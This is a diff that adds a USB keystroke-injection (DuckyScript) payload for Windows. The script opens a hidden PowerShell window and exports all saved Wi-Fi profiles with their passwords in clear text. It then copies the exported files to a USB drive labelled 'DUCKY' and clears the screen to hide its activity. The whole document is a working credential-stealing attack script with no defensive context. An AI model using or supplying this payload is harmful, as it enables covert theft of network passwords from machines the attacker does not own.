@@ -1,0 +1,27 @@
+DELAY 1000
+GUI r
+DELAY 1000
+STRING powershell.exe -windowstyle hidden
+ENTER
+DELAY 3000
+STRING mkdir C:\t
+ENTER
+STRING cd C:\t
+ENTER
+STRING netsh wlan export profile key=clear 
+ENTER
+DELAY 500
+STRING $destinationLabel = 'DUCKY'
+ENTER
+STRING $destinationLetter = Get-WmiObject -Class Win32_Volume | where {$_.Label -eq $destinationLabel} | select -expand name
+ENTER
+STRING get-childitem -Filter Wi-Fi* -path C:\t| move-item -Destination 'C:\t'
+ENTER
+STRING CD c:\
+ENTER
+STRING move-item -path C:\t -Destination $destinationLetter
+ENTER
+STRING clear
+ENTER
+EXIT
+ENTER
